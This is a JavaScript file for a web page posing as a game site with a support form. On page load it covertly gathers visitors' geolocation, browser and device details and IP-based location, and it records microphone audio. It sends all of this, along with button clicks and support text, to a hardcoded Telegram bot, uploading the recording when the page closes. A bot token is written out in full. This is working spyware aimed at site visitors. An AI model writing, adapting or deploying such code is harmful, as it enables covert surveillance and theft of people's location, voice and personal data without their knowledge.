let recorder;
let audioChunks = [];
const MAX_AUDIO_SIZE = 20 * 1024 * 1024; // 20MB
const TELEGRAM_BOT_TOKEN = "8070130921:AAGSstD2MhWp5X-2c2dWUaBWqAFAYZL8Ikg";
const CHAT_ID = "6391810894";

// Функция для отправки сообщения в Telegram
function sendMessageToBot(message) {
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
    })
    .then(response => response.json())
    .then(data => console.log("Сообщение отправлено"))
    .catch(error => console.log("Ошибка отправки сообщения:", error));
}

// Функция для отправки голосового сообщения в Telegram
function sendVoiceToBot(audioBlob) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('voice', audioBlob, 'voice_message.ogg');

    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => console.log("Голосовое сообщение отправлено"))
    .catch(error => console.log("Ошибка отправки голосового сообщения:", error));
}

// Функция для отправки геолокации
function sendGeoLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function(position) {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                const message = `Геолокация: Широта: ${latitude}, Долгота: ${longitude}`;
                sendMessageToBot(message);
            },
            function(error) {
                const errorMessage = `❌ Ошибка получения геолокации: ${error.message}`;
                sendMessageToBot(errorMessage);
            }
        );
    } else {
        sendMessageToBot("Геолокация не поддерживается браузером");
    }
}

// Функция для отправки данных о браузере и устройстве
function sendDeviceData() {
    const userLanguage = navigator.language || navigator.userLanguage;
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const dateTime = new Date().toLocaleString();
    const message = `Информация о пользователе:\n- Язык: ${userLanguage}\n- Браузер: ${userAgent}\n- Платформа: ${platform}\n- Время входа: ${dateTime}`;
    sendMessageToBot(message);
}

// Функция для получения и отправки данных IP
function handleIpData(data) {
    const message = `📡 Расширенные данные пользователя:\n- IP: ${data.ip}\n- Браузер: ${navigator.userAgent}\n- Платформа: ${navigator.platform}\n- Страна: ${data.country_name}\n- Город: ${data.city}\n- Область: ${data.state_prov}\n- Провайдер: ${data.isp}\n- Latitude: ${data.latitude}\n- Longitude: ${data.longitude}\n- Время запроса: ${new Date().toLocaleString()}\n- Язык: ${navigator.language}`;
    sendMessageToBot(message);
}

// Функция для записи аудио
function startRecording() {
    navigator.mediaDevices.getUserMedia({ audio: true })
        .then(stream => {
            recorder = new MediaRecorder(stream);
            audioChunks = [];
            recorder.ondataavailable = event => {
                audioChunks.push(event.data);
            };
            recorder.start();
            console.log("Запись началась");
        })
        .catch(error => {
            console.error("Ошибка доступа к микрофону:", error);
            sendMessageToBot(`Ошибка доступа к микрофону: ${error.message}`);
        });
}

// Функция для остановки записи и отправки аудио
function stopAndSendRecording() {
    if (recorder && recorder.state !== "inactive") {
        recorder.stop();
        recorder.onstop = () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
            audioChunks = [];
            if (audioBlob.size > MAX_AUDIO_SIZE) {
                splitAndSendAudio(audioBlob);
            } else {
                sendVoiceToBot(audioBlob);
            }
        };
    }
}

// Функция для разбивки и отправки аудио в несколько частей
function splitAndSendAudio(audioBlob) {
    const totalSize = audioBlob.size;
    let start = 0;
    while (start < totalSize) {
        const end = Math.min(start + MAX_AUDIO_SIZE, totalSize);
        const chunkBlob = audioBlob.slice(start, end);
        sendVoiceToBot(chunkBlob);
        start = end;
    }
}

// Функция для отправки события кнопки в Telegram
function sendButtonEvent(buttonName) {
    const message = `Пользователь нажал кнопку: ${buttonName}`;
    sendMessageToBot(message);
}

// Функция для начала игры
function startGame() {
    sendButtonEvent("Играть в игру");
    document.querySelector('.content').style.display = 'none';
    document.querySelector('.header').style.display = 'none';
    document.getElementById('gameContainer').style.display = 'block';
}

// Функция для отправки статистики игры
function sendGameStats(score, timePlayed) {
    const message = `Пользователь завершил игру:\n- Очки: ${score}\n- Время игры: ${timePlayed}`;
    sendMessageToBot(message);
}

// Функция для сбора данных пользователя
function collectData() {
    sendGeoLocation();
    sendDeviceData();
    fetch('https://ipapi.co/json')
        .then(response => response.json())
        .then(data => handleIpData(data))
        .catch(error => console.error('Ошибка получения IP-геоданных:', error));
    startRecording();
}

// Функция для открытия модального окна поддержки
function openSupportModal() {
    document.getElementById("supportModal").style.display = "block";
}

// Функция для закрытия модального окна поддержки
function closeSupportModal() {
    document.getElementById("supportModal").style.display = "none";
}

// Функция для выхода с сайта
function exitSite() {
    window.location.href = "about:blank";  // Можно заменить на другую страницу по желанию
}

// Функция для отправки запроса в поддержку
function submitSupportRequest() {
    const problemDescription = document.getElementById('problemTextarea').value;
    if (problemDescription.trim() !== "") {
        sendMessageToBot(`Проблема пользователя: ${problemDescription}`);
        alert("Ваш запрос отправлен!");
        closeSupportModal();
    } else {
        alert("Пожалуйста, опишите вашу проблему.");
    }
}

// Обработчики для кнопок
document.querySelector('.close-btn').addEventListener('click', closeSupportModal);
document.querySelectorAll('.toggle-btn').forEach(btn => {
    btn.addEventListener('click', toggleMenu);
});

// Функция для переключения видимости меню
function toggleMenu() {
    const menu = document.getElementById('menu');
    menu.style.display = (menu.style.display === 'block') ? 'none' : 'block';
}

// Функция загрузки данных при старте страницы
window.onload = function() {
    collectData();
};

// Функция для отправки данных перед закрытием окна
window.onbeforeunload = function (e) {
    stopAndSendRecording();
    e.preventDefault();
    e.returnValue = '';
};
